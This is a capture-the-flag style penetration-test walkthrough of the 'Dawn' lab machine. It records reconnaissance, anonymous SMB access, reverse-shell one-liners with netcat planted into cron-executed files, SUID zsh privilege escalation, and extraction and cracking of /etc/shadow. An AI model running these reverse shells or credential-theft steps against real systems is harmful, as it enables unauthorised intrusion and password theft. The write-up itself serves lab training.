<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Dawn</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Dawn</h1><br/><p></p><p></p><p><h1>Methodology</h1></p><p> </p><p></p><p><h3>Discover IP address</h3></p><p>ip a </p><p>sudo netdiscover -P -i eth0 -r 10.0.0.0/24</p><p></p><p><h3>Discover open ports on the target machine</h3></p><p> </p><p><a href="file:///C:/Users/Uzodi/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg"><img src="images/3-1.png" alt="images/3-1.png" /></a></p><p>Discover service versions of the services on the open ports    </p><p> <a href="file:///C:/Users/Uzodi/AppData/Local/Temp/msohtmlclip1/01/clip_image004.jpg"><img src="images/3-2.png" alt="images/3-2.png" /></a></p><p> </p><p><strong>Vulnerability 1 (V1): The account in use for the smb2 server is a guest account </strong></p><p></p><p><h2>Port 80 -HTTP</h2></p><p>Run a directory bursting tool Dirb</p><p>run dirb <a href="http://10.0.0.119">http://10.0.0.119</a> and found http://10.0.0.119/index.html &amp; <a href="http://10.0.0.119/logs/">http://10.0.0.119/logs/</a></p><p>Landing page <a href="http://10.0.0.119">http://10.0.0.119</a> and http://10.0.0.119/index.html are under construction</p><p><a href="file:///C:/Users/Uzodi/AppData/Local/Temp/msohtmlclip1/01/clip_image006.jpg"><img src="images/3-3.png" alt="images/3-3.png" /></a></p><p>visit  <a href="http://10.0.0.119/robots.txt">http://10.0.0.119/robots.txt</a> and found nothing</p><p><a href="file:///C:/Users/Uzodi/AppData/Local/Temp/msohtmlclip1/01/clip_image008.jpg"><img src="images/3-4.png" alt="images/3-4.png" /></a></p><p><strong>V2: Management logs that are internet facing. </strong></p><p>We can download the management.log from it and take a look</p><p>run the nikto tool </p><p><a href="file:///C:/Users/Uzodi/AppData/Local/Temp/msohtmlclip1/01/clip_image010.jpg"><img src="images/3-5.png" alt="images/3-5.png" /></a> </p><p></p><p><h2>Port 139 &amp; 445 SMB SERVER</h2></p><p>From the service version scan we see the smb server on ports 139 and 445  </p><p>Use enum4linux for enumeration</p><p>Enum4linux -a 10.0.0.119</p><p> </p><p> </p><p><a href="file:///C:/Users/Uzodi/AppData/Local/Temp/msohtmlclip1/01/clip_image012.jpg"><img src="images/3-6.png" alt="images/3-6.png" /></a></p><p><strong>V3: The server allows login without username and password</strong></p><p>Use <em><span style="color:#0070c0;">smbclient -L 10.0.0.119</span></em><span style="color:#0070c0;"> </span>to list all the resources we find aa shared disk ITDEPT</p><p><em><span style="color:#0070c0;">smbclient -L //10.0.0.119/ITDEPT</span></em></p><p><em><span style="color:#0070c0;">smbclient  //10.0.0.119/ITDEPT</span></em><span style="color:#0070c0;"> </span>we log into the smb share without a password, however it is empty </p><p><a href="file:///C:/Users/Uzodi/AppData/Local/Temp/msohtmlclip1/01/clip_image014.jpg"><img src="images/3-7.png" alt="images/3-7.png" /></a></p><p><strong>V4: No password required to access SMB share</strong></p><p><strong> </strong></p><p>Review management logs and find some cron jobs running every few minutes that change the permissions for product-control and web-control to 777 and it will run as www-data for web-control and as dawn for product control. Phobos is also being run as root from the ganimedes home menu.</p><p><a href="file:///C:/Users/Uzodi/AppData/Local/Temp/msohtmlclip1/01/clip_image016.jpg"><img src="images/3-8.png" alt="images/3-8.png" /></a></p><p><span style="color:#ff0000;">We observe that the product-control and web-control files as well as phobos does not exist</span></p><p><strong>V7 : Setting up cron jobs with non-existent files (web-control, product-control and phobos)</strong></p><p></p><p><h2>Generating Reverse shell</h2></p><p></p><p><h3>Rooting the machine – Method 1</h3></p><p>We create our own product-control file, write a script that creates a reverse shell when executed</p><p><em><span style="color:#0070c0;">nano product-control </span></em></p><p><em><span style="color:#0070c0;">nc -nv 10.0.0.194 4444 -e /bin/sh  </span></em>(change IP address to Kali(attacker) machine address and pick a port)</p><p>connect to the smb share and upload the file created with<em> </em><em><span style="color:#0070c0;">put product-control</span></em></p><p>Open a listener on the attacker’s machine<em> </em><em><span style="color:#0070c0;">nc -nvlp 4444 </span></em>and wait for the command to be executed</p><p><a href="file:///C:/Users/Uzodi/AppData/Local/Temp/msohtmlclip1/01/clip_image018.jpg"><img src="images/3-9.png" alt="images/3-9.png" /></a></p><p>I now have a reverse shell as user dawn, I will spawn a better shell with <em><span style="color:#0070c0;">python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span></em></p><p>We run this command <em><span style="color:#0070c0;">find / -user root -perm -4000 2&gt;/dev/null </span></em>to search for all the files that belong to root and have an SUID bit set. We searched the results in <a href="https://gtfobins.github.io/">GTFOBins</a> to determine which of them we could exploit.</p><p>One of the results was /usr/bin/zsh from <a href="https://gtfobins.github.io/gtfobins/zsh/#file-read">zsh | GTFOBins</a>, we can break out of restricted environments by spawning an interactive system shell using the <em><span style="color:#0070c0;">zsh</span></em> command</p><p><a href="file:///C:/Users/Uzodi/AppData/Local/Temp/msohtmlclip1/01/clip_image020.jpg"><img src="images/3-10.png" alt="images/3-10.png" /></a>  </p><p><a href="file:///C:/Users/Uzodi/AppData/Local/Temp/msohtmlclip1/01/clip_image022.jpg"><img src="images/3-11.png" alt="images/3-11.png" /></a></p><p>We now have root access</p><p></p><p><h3>Rooting the machine – Method 2</h3></p><p>We create our own web-control file, write a script that creates a reverse shell when executed</p><p><em><span style="color:#0070c0;">nano web-control </span></em></p><p><em><span style="color:#0070c0;"> nc -nv 10.0.0.194 4545 -e /bin/sh  </span></em><em>(change IP address to Kali machine address and pick a port)</em></p><p>connect to the smb share and upload the file created with<em> </em><em><span style="color:#0070c0;">put web-control</span></em> </p><p>Open a listener on the attacker’s machine<em> </em><em><span style="color:#0070c0;">nc -nvlp 4444 </span></em>and wait for the command to be executed</p><p><a href="file:///C:/Users/Uzodi/AppData/Local/Temp/msohtmlclip1/01/clip_image024.jpg"><img src="images/3-12.png" alt="images/3-12.png" /></a></p><p>We run this command <em><span style="color:#0070c0;">find / -user root -perm -4000 2&gt;/dev/null </span></em>to search for all the files that belong to root and have an SUID bit set. We searched the results in <a href="https://gtfobins.github.io/">GTFOBins</a> to determine which of them we could exploit.</p><p>One of the results was /usr/bin/zsh from <a href="https://gtfobins.github.io/gtfobins/zsh/#file-read">zsh | GTFOBins</a> there is a way to read restricted files using zsh</p><p>We use the following commands to send the contents of the etc/shadow file to a file dawn.shadow</p><p><em><span style="color:#0070c0;">export LFILE=/etc/shadow</span></em></p><p><em><span style="color:#0070c0;">zsh -c &#39;echo &quot;$(&lt;$LFILE)&quot;&#39; &gt; dawn.shadow</span></em></p><p><span style="color:#0070c0;"> </span></p><p>Send the contents of the etc/passwd to a new file too</p><p><em><span style="color:#0070c0;">cat /etc/passwd &gt; dawn.passwd</span></em></p><p>Spin up a server to transfer these files to your Kali(attacker machine) </p><p><em><span style="color:#0070c0;">python3 -m http.server 5555 (you can pick a port)</span></em></p><p>Move the two files</p><p><em><span style="color:#0070c0;">wget </span></em><em><a href="http://10.0.0.119:5555/dawn.shadow">http://10.0.0.119:5555/dawn.shadow</a></em></p><p><em><span style="color:#0070c0;">wget http://10.0.0.119:5555/dawn.passwd</span></em></p><p>With the two files on the attacker machine, we combine them into a single file dawn.hash using </p><p><em><span style="color:#0070c0;">unshadow dawn.passwd dawn.shadow &gt; dawn.hash</span></em></p><p>Try to crack the password using John the ripper </p><p><em><span style="color:#0070c0;">john dawn.hash</span></em></p><p>               </p><p><a href="file:///C:/Users/Uzodi/AppData/Local/Temp/msohtmlclip1/01/clip_image026.jpg"><img src="images/3-13.png" alt="images/3-13.png" /></a></p><p><strong>V4: User ganimedes used a weak password that was easy to crack using John the Ripper</strong></p><p>Log in as user ganimedes with password sunshine</p><p><a href="file:///C:/Users/Uzodi/AppData/Local/Temp/msohtmlclip1/01/clip_image028.jpg"><img src="images/3-14.png" alt="images/3-14.png" /></a></p><p> </p><p>Move to the home directory and look at the .bash_history file</p><p><a href="file:///C:/Users/Uzodi/AppData/Local/Temp/msohtmlclip1/01/clip_image030.jpg"><img src="images/3-15.png" alt="images/3-15.png" /></a></p><p> </p><p>V5: saved passphrase in clear text </p><p>We try this long passphrase with the root user and we are able to gain access </p><p> </p><p><a href="file:///C:/Users/Uzodi/AppData/Local/Temp/msohtmlclip1/01/clip_image032.jpg"><img src="images/3-16.png" alt="images/3-16.png" /></a></p><p><strong><span style="color:#ff0000;">Gained root access</span></strong></p><p><strong><span style="color:#ff0000;"> </span></strong></p><p></p><p><h3>Rooting the machine – Method 3</h3></p><p><strong><span style="color:#ff0000;"> </span></strong></p><p>While logged on as ganimedes we know there is a cron job that executes a phobos file as root and the file does not exist, so we create our own file and write a script that creates a reverse shell when executed</p><p><a href="file:///C:/Users/Uzodi/AppData/Local/Temp/msohtmlclip1/01/clip_image034.jpg"><img src="images/3-17.png" alt="images/3-17.png" /></a></p><p>Open up a listener on port 5555<strong> </strong><em><span style="color:#0070c0;">nc -nvlp 5555 </span></em>and wait, the command gets executed and we now have root access</p><p><em><span style="color:#0070c0;"> </span></em></p><p><a href="file:///C:/Users/Uzodi/AppData/Local/Temp/msohtmlclip1/01/clip_image036.jpg"><img src="images/3-18.png" alt="images/3-18.png" /></a></p><p><strong><span style="color:#ff0000;">There is a vulnerability that can be exploit form mySQL</span></strong></p><p><strong><span style="color:#ff0000;"> </span></strong></p><p> </p><p> </p></div>
</body>
</html>
